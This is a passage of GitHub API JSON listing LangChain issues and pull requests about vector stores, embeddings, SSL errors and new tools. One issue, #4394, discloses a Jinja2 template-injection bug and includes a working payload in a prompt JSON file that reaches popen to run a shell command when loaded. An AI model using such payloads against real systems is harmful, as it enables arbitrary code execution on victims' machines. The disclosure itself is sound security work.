        "created_at": "2023-05-09T12:57:24Z",
        "updated_at": "2023-11-30T15:44:47Z",
        "closed_at": "2023-09-15T16:14:33Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nWeaviate vectorstore not getting initialized with Azure OpenAI embeddings.\r\n\r\n\r\nCode:\r\n```\r\nfrom langchain.embeddings import OpenAIEmbeddings\r\nfrom langchain.vectorstores import Weaviate\r\nfrom langchain.embeddings.base import Embeddings\r\n\r\n\r\n\r\nauth_config = weaviate.auth.AuthApiKey(api_key=WEAVIATE_API)\r\nclient = weaviate.Client(url=WEAVIATE_HOST, auth_client_secret=auth_config)\r\nembeddings_model: Embeddings = OpenAIEmbeddings(model=\"text-embedding-ada-002\", chunk_size=1)\r\nvectorstore = Weaviate(client=client, index_name=\"chatbot_dev\", text_key=\"content\", embedding=embeddings_model)\r\n```\r\nError:\r\n```\r\nTypeError: Weaviate.__init__() got an unexpected keyword argument 'embedding'\r\n```\r\n\r\nAlso, tried to initialize with Weaviate.from_texts() \r\n\r\n```\r\nfrom langchain.vectorstores import Weaviate\r\nqa = Weaviate.from_texts(texts=['here is a sample'], embedding=embeddings_model, index_name=\"content\", weaviate_url=\"your Weaviate URL\")\r\n```\r\nError:\r\n```\r\nNotImplementedError: weaviate does not currently support `from_texts`\r\n```\r\n\n\n### Who can help?\n\n@ruanwz @vowelparrot \n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [ ] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [X] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [X] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\n```\r\nfrom langchain.embeddings import OpenAIEmbeddings\r\nfrom langchain.vectorstores import Weaviate\r\nfrom langchain.embeddings.base import Embeddings\r\n\r\n\r\n\r\nauth_config = weaviate.auth.AuthApiKey(api_key=WEAVIATE_API)\r\nclient = weaviate.Client(url=WEAVIATE_HOST, auth_client_secret=auth_config)\r\nembeddings_model: Embeddings = OpenAIEmbeddings(model=\"text-embedding-ada-002\", chunk_size=1)\r\nvectorstore = Weaviate(client=client, index_name=\"chatbot_dev\", text_key=\"content\", embedding=embeddings_model)\r\n```\n\n### Expected behavior\n\nWeaviate vector store library should be generic to support multiple use cases. ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4394",
        "id": 1701910416,
        "node_id": "I_kwDOIPDwls5lcReQ",
        "number": 4394,
        "title": "Template injection to arbitrary code execution",
        "user": {
            "login": "r3pwnx",
            "id": 79240390,
            "node_id": "MDQ6VXNlcjc5MjQwMzkw",
            "avatar_url": "https://avatars.githubusercontent.com/u/79240390?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/r3pwnx",
            "html_url": "https://github.com/r3pwnx",
            "followers_url": "https://api.github.com/users/r3pwnx/followers",
            "following_url": "https://api.github.com/users/r3pwnx/following{/other_user}",
            "gists_url": "https://api.github.com/users/r3pwnx/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/r3pwnx/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/r3pwnx/subscriptions",
            "organizations_url": "https://api.github.com/users/r3pwnx/orgs",
            "repos_url": "https://api.github.com/users/r3pwnx/repos",
            "events_url": "https://api.github.com/users/r3pwnx/events{/privacy}",
            "received_events_url": "https://api.github.com/users/r3pwnx/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2023-05-09T12:28:24Z",
        "updated_at": "2023-10-10T15:15:44Z",
        "closed_at": "2023-10-10T15:15:44Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\nwindows 11\r\n\r\n### Who can help?\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [X] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [ ] LLMs/Chat Models\r\n- [ ] Embedding Models\r\n- [X] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [ ] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\n1. save the following data to pt.json\r\n\r\n```json\r\n{\r\n    \"input_variables\": [\r\n        \"prompt\"\r\n    ],\r\n    \"output_parser\": null,\r\n    \"partial_variables\": {},\r\n    \"template\": \"Tell me a {{ prompt }} {{ ''.__class__.__bases__[0].__subclasses__()[147].__init__.__globals__['popen']('dir').read() }}\",\r\n    \"template_format\": \"jinja2\",\r\n    \"validate_template\": true,\r\n    \"_type\": \"prompt\"\r\n}\r\n\r\n```\r\n\r\n2. run\r\n\r\n```python\r\nfrom langchain.prompts import load_prompt\r\nloaded_prompt = load_prompt(\"pt.json\")\r\nloaded_prompt.format(history=\"\", prompt=\"What is 1 + 1?\")\r\n```\r\n\r\n\r\n3. the `dir` command will be execute \r\n\r\n\r\nattack scene: Alice can send prompt file to Bob and let Bob to load it.  \r\nanalysis: Jinja2 is used to concat prompts. Template injection will happened\r\nnote: in the pt.json, the `template` has payload, the index of `__subclasses__` maybe different in other environment.\r\n\r\n\r\n\r\n\r\n### Expected behavior\r\n\r\ncode should not be execute",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4394/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4393",
        "id": 1701850614,
        "node_id": "PR_kwDOIPDwls5QFaqV",
        "number": 4393,
        "title": "Specify which data to return from chromadb",
        "user": {
            "login": "mandgie",
            "id": 22856782,
            "node_id": "MDQ6VXNlcjIyODU2Nzgy",
            "avatar_url": "https://avatars.githubusercontent.com/u/22856782?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mandgie",
            "html_url": "https://github.com/mandgie",
            "followers_url": "https://api.github.com/users/mandgie/followers",
            "following_url": "https://api.github.com/users/mandgie/following{/other_user}",
            "gists_url": "https://api.github.com/users/mandgie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mandgie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mandgie/subscriptions",
            "organizations_url": "https://api.github.com/users/mandgie/orgs",
            "repos_url": "https://api.github.com/users/mandgie/repos",
            "events_url": "https://api.github.com/users/mandgie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mandgie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T10:56:18Z",
        "updated_at": "2023-05-16T21:43:10Z",
        "closed_at": "2023-05-16T21:43:10Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4393",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4393",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4393.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4393.patch",
            "merged_at": "2023-05-16T21:43:10Z"
        },
        "body": "# Improve the Chroma get() method by adding the optional \"include\" parameter.\r\n\r\nThe Chroma get() method excludes embeddings by default. You can customize the response by specifying the \"include\" parameter to selectively retrieve the desired data from the collection.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4393/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4392",
        "id": 1701796310,
        "node_id": "PR_kwDOIPDwls5QFO4a",
        "number": 4392,
        "title": "DocArray integration - InMemory and Hnsw Search",
        "user": {
            "login": "jupyterjazz",
            "id": 45267439,
            "node_id": "MDQ6VXNlcjQ1MjY3NDM5",
            "avatar_url": "https://avatars.githubusercontent.com/u/45267439?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jupyterjazz",
            "html_url": "https://github.com/jupyterjazz",
            "followers_url": "https://api.github.com/users/jupyterjazz/followers",
            "following_url": "https://api.github.com/users/jupyterjazz/following{/other_user}",
            "gists_url": "https://api.github.com/users/jupyterjazz/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jupyterjazz/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jupyterjazz/subscriptions",
            "organizations_url": "https://api.github.com/users/jupyterjazz/orgs",
            "repos_url": "https://api.github.com/users/jupyterjazz/repos",
            "events_url": "https://api.github.com/users/jupyterjazz/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jupyterjazz/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-09T10:18:53Z",
        "updated_at": "2023-05-10T22:22:37Z",
        "closed_at": "2023-05-10T22:22:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4392",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4392",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4392.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4392.patch",
            "merged_at": null
        },
        "body": "Implementation of two new vectorstores using [docarray](https://docs.docarray.org/)\r\n\r\n## `DocArrayInMemorySearch`\r\n[DocArrayInMemorySearch](https://docs.docarray.org/user_guide/storing/index_in_memory/) is a document index that stores documents in memory. It is a great starting point for small datasets, where you may not want to launch a database server.\r\n\r\n## `DocArrayHnswSearch`\r\n[DocArrayHnswSearch](https://docs.docarray.org/user_guide/storing/index_hnswlib/) is a lightweight Document Index implementation that runs fully locally and is best suited for small- to medium-sized datasets. It stores vectors on disk in [hnswlib](https://github.com/nmslib/hnswlib), and stores all other data in [SQLite](https://www.sqlite.org/index.html).\r\n\r\n\r\n## Who can review?\r\n@hwchase17\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392/reactions",
            "total_count": 4,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 3,
            "rocket": 0,
            "eyes": 1
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4392/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4391",
        "id": 1701688968,
        "node_id": "I_kwDOIPDwls5lbbaI",
        "number": 4391,
        "title": "SSLError: HTTPSConnectionPool(host='api.llm.writer.com', port=443): Max retries exceeded",
        "user": {
            "login": "chakravarthik27",
            "id": 23481244,
            "node_id": "MDQ6VXNlcjIzNDgxMjQ0",
            "avatar_url": "https://avatars.githubusercontent.com/u/23481244?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/chakravarthik27",
            "html_url": "https://github.com/chakravarthik27",
            "followers_url": "https://api.github.com/users/chakravarthik27/followers",
            "following_url": "https://api.github.com/users/chakravarthik27/following{/other_user}",
            "gists_url": "https://api.github.com/users/chakravarthik27/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/chakravarthik27/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/chakravarthik27/subscriptions",
            "organizations_url": "https://api.github.com/users/chakravarthik27/orgs",
            "repos_url": "https://api.github.com/users/chakravarthik27/repos",
            "events_url": "https://api.github.com/users/chakravarthik27/events{/privacy}",
            "received_events_url": "https://api.github.com/users/chakravarthik27/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T09:19:32Z",
        "updated_at": "2023-09-10T16:19:57Z",
        "closed_at": "2023-09-10T16:19:56Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\n**Version Information**\r\n\r\n**Platform**      :  Windows 10\r\n**LangChain**  -  0.0.149\r\n**Python**        -  3.8.9\r\n\r\n### Who can help?\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [X] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [X] LLMs/Chat Models\r\n- [ ] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [ ] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [X] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\nThe step-by-step process from given [link](https://python.langchain.com/en/latest/modules/models/llms/integrations/writer.html)\r\n\r\n![image](https://user-images.githubusercontent.com/23481244/237052818-5f14f21a-727f-4e39-8b5b-845ec6f8e286.png)\r\n\r\n\r\nTo reproduce the SSLError \r\n![image](https://user-images.githubusercontent.com/23481244/237051889-0cf0d7c1-9e8c-43d0-8c68-f716c8b6281e.png)\r\n\r\n\r\n\r\nhttps://python.langchain.com/en/latest/modules/models/llms/integrations/writer.html\r\n\r\n### Expected behavior\r\n\r\nRun the code with errors and warnings with Writer LLM ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4391/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4390",
        "id": 1701670224,
        "node_id": "PR_kwDOIPDwls5QEzkZ",
        "number": 4390,
        "title": "Add image generation tool",
        "user": {
            "login": "EniasCailliau",
            "id": 13366849,
            "node_id": "MDQ6VXNlcjEzMzY2ODQ5",
            "avatar_url": "https://avatars.githubusercontent.com/u/13366849?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/EniasCailliau",
            "html_url": "https://github.com/EniasCailliau",
            "followers_url": "https://api.github.com/users/EniasCailliau/followers",
            "following_url": "https://api.github.com/users/EniasCailliau/following{/other_user}",
            "gists_url": "https://api.github.com/users/EniasCailliau/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/EniasCailliau/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/EniasCailliau/subscriptions",
            "organizations_url": "https://api.github.com/users/EniasCailliau/orgs",
            "repos_url": "https://api.github.com/users/EniasCailliau/repos",
            "events_url": "https://api.github.com/users/EniasCailliau/events{/privacy}",
            "received_events_url": "https://api.github.com/users/EniasCailliau/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T09:08:40Z",
        "updated_at": "2023-05-12T13:16:10Z",
        "closed_at": "2023-05-12T13:16:10Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4390",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4390",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4390.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4390.patch",
            "merged_at": "2023-05-12T13:16:10Z"
        },
        "body": "# Add Image Generation Tool - First step towards multi-modal agents\r\n\r\nThis PR introduces a Tool called GenerateImageTool that generates an image using image generation APIs. Today Dall-E and StableDiffusion are supported. \r\n\r\n- [x] Add `GenerateImageTool` that generates an image and returns either a URL or UUID \r\n- [x] Add a tutorial that shows how you can use the `GenerateImageTool` to create multi-modal output agents. \r\n\r\n@hwchase17 and @vowelparrot Excited to hear your thoughts. Would love to collab on multi-modal agents! \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4390/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4389",
        "id": 1701668973,
        "node_id": "PR_kwDOIPDwls5QEzTP",
        "number": 4389,
        "title": "Fix AzureOpenAI embeddings documentation example. model -> deployment",
        "user": {
            "login": "IsmaelGSerrano",
            "id": 50013692,
            "node_id": "MDQ6VXNlcjUwMDEzNjky",
            "avatar_url": "https://avatars.githubusercontent.com/u/50013692?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/IsmaelGSerrano",
            "html_url": "https://github.com/IsmaelGSerrano",
            "followers_url": "https://api.github.com/users/IsmaelGSerrano/followers",
            "following_url": "https://api.github.com/users/IsmaelGSerrano/following{/other_user}",
            "gists_url": "https://api.github.com/users/IsmaelGSerrano/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/IsmaelGSerrano/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/IsmaelGSerrano/subscriptions",
            "organizations_url": "https://api.github.com/users/IsmaelGSerrano/orgs",
            "repos_url": "https://api.github.com/users/IsmaelGSerrano/repos",
            "events_url": "https://api.github.com/users/IsmaelGSerrano/events{/privacy}",
            "received_events_url": "https://api.github.com/users/IsmaelGSerrano/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T09:07:59Z",
        "updated_at": "2023-05-18T04:05:54Z",
        "closed_at": "2023-05-18T04:05:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4389",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4389",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4389.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4389.patch",
            "merged_at": "2023-05-18T04:05:54Z"
        },
        "body": "# Documentation for Azure OpenAI embeddings model\r\n\r\n- OPENAI_API_VERSION environment variable is needed for the endpoint\r\n- The constructor does not work with model, it works with deployment.\r\n\r\nI fixed it in the notebook.\r\n\r\n(This is my first contribution)\r\n\r\n## Who can review?\r\n\r\n@hwchase17 \r\n@agola\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4389/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4388",
        "id": 1701615173,
        "node_id": "PR_kwDOIPDwls5QEnyK",
        "number": 4388,
        "title": "add milvus _similarity_search_with_relevance_scores",
        "user": {
            "login": "jxyxiangyu",
            "id": 65048993,
            "node_id": "MDQ6VXNlcjY1MDQ4OTkz",
            "avatar_url": "https://avatars.githubusercontent.com/u/65048993?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jxyxiangyu",
            "html_url": "https://github.com/jxyxiangyu",
            "followers_url": "https://api.github.com/users/jxyxiangyu/followers",
            "following_url": "https://api.github.com/users/jxyxiangyu/following{/other_user}",
            "gists_url": "https://api.github.com/users/jxyxiangyu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jxyxiangyu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jxyxiangyu/subscriptions",
            "organizations_url": "https://api.github.com/users/jxyxiangyu/orgs",
            "repos_url": "https://api.github.com/users/jxyxiangyu/repos",
            "events_url": "https://api.github.com/users/jxyxiangyu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jxyxiangyu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T08:37:13Z",
        "updated_at": "2023-05-09T11:55:40Z",
        "closed_at": "2023-05-09T11:32:47Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4388",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4388",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4388.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4388.patch",
            "merged_at": null
        },
        "body": "When I used the generative agent code of the virtual town, I used milvus, but reported the following unimplemented error\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/Users/jxyxiangyu/project/smartMarketing/agent/demo_for_chat.py\", line 103, in <module>\r\n    print(tommie.get_summary())\r\n          ^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/generative_agent.py\", line 215, in get_summary\r\n    self.summary = self._compute_agent_summary()\r\n                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/generative_agent.py\", line 202, in _compute_agent_summary\r\n    .run(name=self.name, queries=[f\"{self.name}'s core characteristics\"])\r\n     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 239, in run\r\n    return self(kwargs, callbacks=callbacks)[self.output_keys[0]]\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 123, in __call__\r\n    inputs = self.prep_inputs(inputs)\r\n             ^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 214, in prep_inputs\r\n    external_context = self.memory.load_memory_variables(inputs)\r\n                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 183, in load_memory_variables\r\n    relevant_memories = [\r\n                        ^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 184, in <listcomp>\r\n    mem for query in queries for mem in self.fetch_memories(query)\r\n                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 147, in fetch_memories\r\n    return self.memory_retriever.get_relevant_documents(observation)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/retrievers/time_weighted_retriever.py\", line 91, in get_relevant_documents\r\n    docs_and_scores.update(self.get_salient_docs(query))\r\n                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/retrievers/time_weighted_retriever.py\", line 72, in get_salient_docs\r\n    docs_and_scores = self.vectorstore.similarity_search_with_relevance_scores(\r\n                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/vectorstores/base.py\", line 120, in similarity_search_with_relevance_scores\r\n    docs_and_similarities = self._similarity_search_with_relevance_scores(\r\n                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/vectorstores/base.py\", line 143, in _similarity_search_with_relevance_scores\r\n    raise NotImplementedError\r\nNotImplementedError\r\n```\r\n\r\nSo, I implement _similarity_search_with_relevance_scores function in milvus.py\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes when using milvus, it will raise _similarity_search_with_relevance_scores not implemented \r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n@hwchase17\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4388/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4387",
